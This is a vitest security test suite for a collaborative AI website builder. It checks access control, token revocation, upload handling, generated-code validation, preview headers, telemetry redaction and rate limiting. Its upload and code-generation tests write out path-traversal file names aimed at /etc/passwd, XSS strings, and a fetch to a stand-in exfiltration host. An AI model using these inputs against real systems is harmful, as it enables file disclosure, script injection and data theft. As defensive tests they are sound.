import { randomUUID } from "node:crypto";
import { rm } from "node:fs/promises";
import path from "node:path";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { eq } from "drizzle-orm";
import { db, sql } from "@/server/db/client";
import { editingLeases, mediaAssets, pageVersions, projectInvites, projectMembers, users } from "@/server/db/schema";
import { WorkspaceService } from "@/domain/workspaces/service";
import { ProjectService } from "@/domain/projects/service";
import { PageTreeService } from "@/domain/pages/service";
import { MediaService } from "@/domain/media/service";
import { BuildingBlockService } from "@/domain/blocks/service";
import { InvitationService } from "@/domain/collaboration/invitation-service";
import { MembershipService } from "@/domain/collaboration/membership-service";
import { EditingLeaseService } from "@/domain/collaboration/lease-service";
import { GenerationJobService, claimGenerationJob } from "@/domain/ai/job-service";
import { AIOrchestrationService } from "@/domain/ai/orchestration-service";
import type { AIProvider, AIRequest, AIResponse, StructuredValidator } from "@/domain/ai/provider";
import { HistoryService } from "@/domain/history/undo-service";
import { VersionRestoreService } from "@/domain/history/restore-service";
import { CheckpointService } from "@/domain/history/checkpoint-service";
import { ExportService } from "@/domain/export/export-service";
import { LocalObjectStorage } from "@/server/storage/local-object-storage";
import { PreviewManifestService } from "@/generated-runtime/manifest/service";
import { PreviewTokenService } from "@/generated-runtime/security/preview-token";
import { previewSecurityHeaders, PREVIEW_IFRAME_SANDBOX } from "@/generated-runtime/security/headers";
import { redactTelemetry } from "@/server/observability/telemetry";
import { fixtureProviderResolver } from "@/domain/ai/testing/provider-fixtures";

const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
type Fragment = { html: string; css?: string; js?: string };
const simplePage: Fragment = { html: `<main data-canvas-id="page" class="c-page"><h1>Home</h1></main>` };

class FixtureProvider implements AIProvider { readonly capabilities = { structuredOutput: true, vision: true };
  name = "fixture"; model = "fixture-1";
  constructor(private readonly fragment: Fragment = simplePage) {}
  async generateText(): Promise<AIResponse> { return { text: "", provider: this.name, model: this.model }; }
  async generateStructured<T>(_request: AIRequest, validator: StructuredValidator<T>): Promise<AIResponse<T>> {
    const value = { schemaVersion: 1, html: this.fragment.html, css: this.fragment.css ?? "", js: this.fragment.js ?? "", referencedMediaIds: [], summary: { headline: "Built", changes: ["Created"], limitations: [] } };
    return { text: "", structuredData: validator.parse(value), provider: this.name, model: this.model };
  }
}
async function makeUser(label: string) { const id = randomUUID(); const [record] = await db.insert(users).values({ id, email: `${label}-${id}@test.dev`, normalizedEmail: `${label}-${id}@test.dev`, displayName: label }).returning(); return record!; }
async function makeProject(userId: string, name: string) {
  const workspace = await new WorkspaceService().create(userId, { name: `${name} workspace` });
  const project = await new ProjectService().create(userId, { workspaceId: workspace.id, name });
  const home = await new PageTreeService().create(userId, { projectId: project.id, type: "page", name: "Home" });
  return { workspace, project, home };
}
async function generateHome(userId: string, projectId: string, pageId: string, fragment: Fragment = simplePage) {
  const request = await new GenerationJobService().createPageJob(userId, { projectId, pageId, content: "build", selectedMediaIds: [] });
  await claimGenerationJob("worker");
  const job = await new AIOrchestrationService(db, undefined, undefined, fixtureProviderResolver(() => new FixtureProvider(fragment))).process(request.job.id);
  if (job?.status !== "completed") throw new Error(`generation failed: ${job?.errorCode}`);
}
async function addMedia(projectId: string, userId: string) {
  const storageKey = `test-security/${randomUUID()}.png`;
  await new LocalObjectStorage().put(storageKey, PNG);
  const [asset] = await db.insert(mediaAssets).values({ projectId, originalFilename: "a.png", displayName: "Asset", storageKey, mimeType: "image/png", sizeBytes: PNG.length, width: 1, height: 1, createdByUserId: userId }).returning();
  return asset!;
}
const denied = /do not have access|not found|Project not found/i;

describe.sequential("security boundaries", () => {
  process.env.PREVIEW_TOKEN_SECRET = "security-suite-preview-secret-value-long-enough";
  beforeEach(async () => { await sql`TRUNCATE TABLE export_jobs, project_checkpoint_items, project_checkpoints, change_set_items, change_sets, building_block_usages, building_block_versions, building_blocks, generation_job_media, page_versions, ai_job_rate_limits, generation_jobs, ai_messages, ai_conversations, project_instructions, media_assets, media_folders, page_nodes, audit_events, editing_leases, project_invites, project_members, auth_rate_limits, sessions, auth_credentials, projects, workspaces, users RESTART IDENTITY CASCADE`; });
  afterAll(async () => {
    await rm(path.resolve(process.cwd(), process.env.LOCAL_STORAGE_PATH || ".canvas-storage", "test-security"), { recursive: true, force: true });
    await sql.end();
  });

  it("blocks horizontal escalation across every project-scoped domain", async () => {
    const owner = await makeUser("owner"); const attacker = await makeUser("attacker");
    const { project, home } = await makeProject(owner.id, "Victim");
    await makeProject(attacker.id, "Attacker");
    await generateHome(owner.id, project.id, home.id);
    const block = await new BuildingBlockService().create(owner.id, { projectId: project.id, name: "Navbar", kind: "navbar" });
    const checkpoint = await new CheckpointService().create(owner.id, { projectId: project.id, name: "Snapshot" });
    const exportJob = await new ExportService().create(owner.id, project.id);
    const [version] = await db.select().from(pageVersions);

    // Every read and every mutation is rejected for a non-member, whatever the domain.
    for (const attempt of [
      () => new ProjectService().read(attacker.id, project.id),
      () => new ProjectService().rename(attacker.id, { id: project.id, name: "Stolen" }),
      () => new PageTreeService().listTree(attacker.id, project.id),
      () => new PageTreeService().create(attacker.id, { projectId: project.id, type: "page", name: "Injected" }),
      () => new PageTreeService().deleteSubtree(attacker.id, { projectId: project.id, nodeId: home.id }),
      () => new MediaService().list(attacker.id, { projectId: project.id }),
      () => new BuildingBlockService().list(attacker.id, { projectId: project.id }),
      () => new BuildingBlockService().archive(attacker.id, { projectId: project.id, blockId: block.id }),
      () => new GenerationJobService().createPageJob(attacker.id, { projectId: project.id, pageId: home.id, content: "hi", selectedMediaIds: [] }),
      () => new GenerationJobService().getPageState(attacker.id, project.id, home.id),
      () => new HistoryService().state(attacker.id, project.id),
      () => new HistoryService().undo(attacker.id, project.id),
      () => new VersionRestoreService().listPageVersions(attacker.id, project.id, home.id),
      () => new VersionRestoreService().restorePageVersion(attacker.id, project.id, home.id, version!.id),
      () => new CheckpointService().list(attacker.id, project.id),
      () => new CheckpointService().restore(attacker.id, project.id, checkpoint.id),
      () => new ExportService().create(attacker.id, project.id),
      () => new ExportService().download(attacker.id, project.id, exportJob.id),
      () => new PreviewManifestService().createSession(attacker.id, project.id),
      () => new EditingLeaseService().acquire(attacker.id, { projectId: project.id, targetType: "page", targetId: home.id }),
      () => new InvitationService().create(attacker.id, { projectId: project.id }),
      () => new MembershipService().list(attacker.id, project.id),
    ]) await expect(attempt()).rejects.toThrow(denied);
  });

  it("rejects guessed UUIDs from another project even for a legitimate owner", async () => {
    const first = await makeUser("first"); const second = await makeUser("second");
    const victim = await makeProject(first.id, "Victim");
    const attacker = await makeProject(second.id, "Attacker");
    await generateHome(first.id, victim.project.id, victim.home.id);
    const [victimVersion] = await db.select().from(pageVersions);
    const victimBlock = await new BuildingBlockService().create(first.id, { projectId: victim.project.id, name: "Navbar", kind: "navbar" });
    const victimCheckpoint = await new CheckpointService().create(first.id, { projectId: victim.project.id, name: "Snapshot" });
    const victimExport = await new ExportService().create(first.id, victim.project.id);
    const victimMedia = await addMedia(victim.project.id, first.id);

    // Foreign IDs supplied against a project the attacker *does* own resolve to nothing.
    await expect(new PageTreeService().rename(second.id, { projectId: attacker.project.id, nodeId: victim.home.id, name: "x" })).rejects.toThrow(/not found/i);
    await expect(new BuildingBlockService().read(second.id, attacker.project.id, victimBlock.id)).rejects.toMatchObject({ blockCode: "BLOCK_NOT_FOUND" });
    await expect(new VersionRestoreService().restorePageVersion(second.id, attacker.project.id, attacker.home.id, victimVersion!.id)).rejects.toMatchObject({ historyCode: "VERSION_NOT_FOUND" });
    await expect(new CheckpointService().restore(second.id, attacker.project.id, victimCheckpoint.id)).rejects.toMatchObject({ historyCode: "CHECKPOINT_NOT_FOUND" });
    await expect(new ExportService().get(second.id, attacker.project.id, victimExport.id)).rejects.toMatchObject({ exportCode: "EXPORT_NOT_FOUND" });
    await expect(new MediaService().readBinary(second.id, victimMedia.id)).rejects.toThrow(denied);
    await expect(new EditingLeaseService().acquire(second.id, { projectId: attacker.project.id, targetType: "page", targetId: victim.home.id })).rejects.toThrow(/not found/i);
  });

  it("blocks a removed collaborator immediately, including issued preview tokens", async () => {
    const owner = await makeUser("owner"); const collaborator = await makeUser("collaborator");
    const { project, home } = await makeProject(owner.id, "Shared");
    await generateHome(owner.id, project.id, home.id);
    await db.insert(projectMembers).values({ projectId: project.id, userId: collaborator.id });

    await expect(new PageTreeService().listTree(collaborator.id, project.id)).resolves.toHaveLength(1);
    const session = await new PreviewManifestService().createSession(collaborator.id, project.id);
    await new MembershipService().remove(owner.id, { projectId: project.id, userId: collaborator.id });

    await expect(new PageTreeService().listTree(collaborator.id, project.id)).rejects.toThrow(denied);
    await expect(new GenerationJobService().createPageJob(collaborator.id, { projectId: project.id, pageId: home.id, content: "hi", selectedMediaIds: [] })).rejects.toThrow(denied);
    // An already-issued preview token is re-authorised on every use, so it stops working.
    await expect(new PreviewManifestService().fromToken(session.token)).rejects.toThrow(denied);
    await expect(new PreviewManifestService().authorizeToken(session.token)).rejects.toThrow(denied);
  });

  it("refuses revoked, expired, and already-used invitations", async () => {
    const owner = await makeUser("owner"); const guest = await makeUser("guest");
    const { project } = await makeProject(owner.id, "Invites");
    const invites = new InvitationService();

    const revoked = await invites.create(owner.id, { projectId: project.id });
    await invites.revoke(owner.id, { projectId: project.id, inviteId: revoked.invite.id });
    await expect(invites.preview(revoked.token)).rejects.toThrow(/invalid or no longer available/i);
    await expect(invites.accept(guest.id, { token: revoked.token })).rejects.toThrow();

    const expired = await invites.create(owner.id, { projectId: project.id });
    await db.update(projectInvites).set({ createdAt: new Date(Date.now() - 7_200_000), expiresAt: new Date(Date.now() - 3_600_000) }).where(eq(projectInvites.id, expired.invite.id));
    await expect(invites.preview(expired.token)).rejects.toThrow(/invalid or no longer available/i);
    await expect(invites.accept(guest.id, { token: expired.token })).rejects.toThrow();

    const valid = await invites.create(owner.id, { projectId: project.id });
    await expect(invites.accept(guest.id, { token: valid.token })).resolves.toMatchObject({ id: project.id });
    // Creating a new invite retires the previous one, so an old link cannot be replayed.
    const replacement = await invites.create(owner.id, { projectId: project.id });
    await expect(invites.preview(valid.token)).rejects.toThrow(/invalid or no longer available/i);
    await expect(invites.preview(replacement.token)).resolves.toMatchObject({ projectId: project.id });
    expect(await db.select().from(projectMembers).where(eq(projectMembers.projectId, project.id))).toHaveLength(1);
  });

  it("hands a stale editing lease to the next collaborator without data loss", async () => {
    const owner = await makeUser("owner"); const collaborator = await makeUser("collaborator");
    const { project, home } = await makeProject(owner.id, "Leases");
    await db.insert(projectMembers).values({ projectId: project.id, userId: collaborator.id });
    const leases = new EditingLeaseService();
    const target = { projectId: project.id, targetType: "page" as const, targetId: home.id };

    await leases.acquire(owner.id, target);
    await expect(leases.acquire(collaborator.id, target)).rejects.toThrow(/currently editing/i);
    await db.update(editingLeases).set({ expiresAt: new Date(Date.now() - 1000) }).where(eq(editingLeases.projectId, project.id));
    // Expiry frees the target; the previous holder can no longer renew it.
    await expect(leases.acquire(collaborator.id, target)).resolves.toMatchObject({ userId: collaborator.id });
    await expect(leases.renew(owner.id, target)).rejects.toThrow(/no longer active/i);
    expect(await leases.getActiveLease(collaborator.id, target)).toMatchObject({ userId: collaborator.id });
  });

  it("keeps uploads inside their storage root and rejects unsupported files", async () => {
    const owner = await makeUser("owner");
    const { project } = await makeProject(owner.id, "Uploads");
    const media = new MediaService();
    const upload = (name: string, bytes: Buffer) => media.upload(owner.id, { projectId: project.id, folderId: null, filename: name, bytes: new Uint8Array(bytes) });

    // Traversal in the filename must never escape the project's storage prefix.
    const traversal = await upload("../../../../etc/passwd.png", PNG);
    expect(traversal.storageKey).toMatch(/^projects\//);
    expect(traversal.storageKey).not.toContain("..");
    expect(path.resolve(process.cwd(), ".canvas-storage", traversal.storageKey)).toContain(`${path.sep}.canvas-storage${path.sep}projects${path.sep}`);
    expect(traversal.originalFilename).not.toContain("/");

    await expect(upload("script.svg", Buffer.from("<svg onload=\"alert(1)\"/>"))).rejects.toThrow();
    await expect(upload("payload.html", Buffer.from("<script>alert(1)</script>"))).rejects.toThrow();
    // A file whose bytes do not match its declared type is rejected on content, not name.
    await expect(upload("fake.png", Buffer.from("<script>alert(1)</script>"))).rejects.toThrow();

    const storage = new LocalObjectStorage();
    for (const key of ["../escape.png", "/etc/passwd", "a/../../b.png", ""]) {
      await expect(storage.get(key)).rejects.toThrow();
      await expect(storage.put(key, PNG)).rejects.toThrow();
    }
  });

  it("never activates unsafe generated code from any surface", async () => {
    const owner = await makeUser("owner");
    const { project, home } = await makeProject(owner.id, "Codegen");
    // One representative escape per validator, run through the real generation pipeline.
    // The exhaustive per-construct matrix lives in the validator's own unit suite; this
    // proves the pipeline refuses to activate any of them.
    for (const unsafe of [
      { html: `<main data-canvas-id="page"></main>`, js: `fetch("https://exfiltrate.example");` },
      { html: `<main data-canvas-id="page"></main>`, js: `document.querySelector("h1").setAttribute("data-canvas-id", "forged");` },
      { html: `<script data-canvas-id="page" src="https://cdn.example/x.js"></script>` },
      { html: `<a data-canvas-id="page" href="javascript:alert(1)">x</a>` },
      { html: `<main data-canvas-id="page"></main>`, css: `@import url("https://evil.example/x.css");` },
    ]) {
      await expect(generateHome(owner.id, project.id, home.id, unsafe)).rejects.toThrow(/AI_GENERATED_DOCUMENT_INVALID/);
    }
    expect(await db.select().from(pageVersions)).toHaveLength(0);
    // Five full generation jobs, each rejected: slower than vitest's default budget.
  }, 180_000);

  it("keeps preview isolation headers and tokens strict", async () => {
    const owner = await makeUser("owner"); const attacker = await makeUser("attacker");
    const { project } = await makeProject(owner.id, "Preview");
    const headers = previewSecurityHeaders("nonce-value", "https://canvas.example");
    expect(PREVIEW_IFRAME_SANDBOX).toBe("allow-scripts");
    expect(headers["Content-Security-Policy"]).toContain("default-src 'none'");
    expect(headers["Content-Security-Policy"]).toContain("frame-ancestors https://canvas.example");
    expect(headers["Content-Security-Policy"]).toContain("connect-src 'none'");
    expect(headers["Content-Security-Policy"]).not.toContain("unsafe-inline");
    expect(headers["Cache-Control"]).toBe("private, no-store");

    const tokens = new PreviewTokenService();
    const issued = tokens.issue(project.id, owner.id);
    expect(() => tokens.verify(`${issued.token}x`)).toThrow();
    expect(() => tokens.verify(issued.token.split(".").reverse().join("."))).toThrow();
    // A valid token for another user's project still fails the membership recheck.
    const foreign = tokens.issue(project.id, attacker.id);
    await expect(new PreviewManifestService().authorizeToken(foreign.token)).rejects.toThrow(denied);
  });

  it("redacts secrets from telemetry regardless of field name", () => {
    const redacted = redactTelemetry({
      projectId: "safe-id",
      token: "abcdef123456",
      sessionToken: "abcdef123456",
      storageKey: "projects/1/2.png",
      prompt: "user text that should not be logged",
      note: "postgresql://user:password@localhost:5432/canvas",
      apiKey: "AIzaSyA1234567890abcdefghijklmnopqrstuv",
      url: "https://cdn.example/asset.png?token=abcdef123456",
      nested: { password: "hunter2", safe: "value" },
    });
    expect(redacted).toMatchObject({ projectId: "safe-id", token: "[redacted]", sessionToken: "[redacted]", storageKey: "[redacted]", prompt: "[redacted]", note: "[redacted]", apiKey: "[redacted]", url: "[redacted]" });
    expect(redacted.nested).toEqual({ password: "[redacted]", safe: "value" });
    expect(JSON.stringify(redacted)).not.toContain("hunter2");
  });

  it("keeps export archives free of traversal and confined to their project", async () => {
    const owner = await makeUser("owner"); const attacker = await makeUser("attacker");
    const { project, home } = await makeProject(owner.id, "Exporting");
    const attackerProject = await makeProject(attacker.id, "Attacker");
    await generateHome(owner.id, project.id, home.id);
    const service = new ExportService();
    const job = await service.create(owner.id, project.id);
    await service.process(job.id);

    const artifact = await service.download(owner.id, project.id, job.id);
    const names = [...Buffer.from(artifact.bytes).toString("latin1").matchAll(/PK\x01\x02[\s\S]{42}([\w./-]{1,120})/g)].map((match) => match[1]!);
    expect(names.length).toBeGreaterThan(0);
    for (const name of names) {
      expect(name.startsWith("/"), name).toBe(false);
      expect(name.includes(".."), name).toBe(false);
    }
    await expect(service.download(attacker.id, attackerProject.project.id, job.id)).rejects.toMatchObject({ exportCode: "EXPORT_NOT_FOUND" });
    await expect(service.download(attacker.id, project.id, job.id)).rejects.toThrow(denied);
  });

  it("rate limits repeated failed sign-ins", async () => {
    const { authenticate, register } = await import("@/domain/auth/service");
    const email = `rate-${randomUUID()}@test.dev`;
    await register({ email, password: "correct horse battery staple", displayName: "Rate" });
    let limited = false;
    for (let attempt = 0; attempt < 12; attempt += 1) {
      try { await authenticate({ email, password: "wrong password entirely" }); }
      catch (error) { if (error instanceof Error && /Too many attempts/i.test(error.message)) { limited = true; break; } }
    }
    expect(limited).toBe(true);
    // The lockout also protects the account from a correct password during the window.
    await expect(authenticate({ email, password: "correct horse battery staple" })).rejects.toThrow(/Too many attempts/i);
  });
});
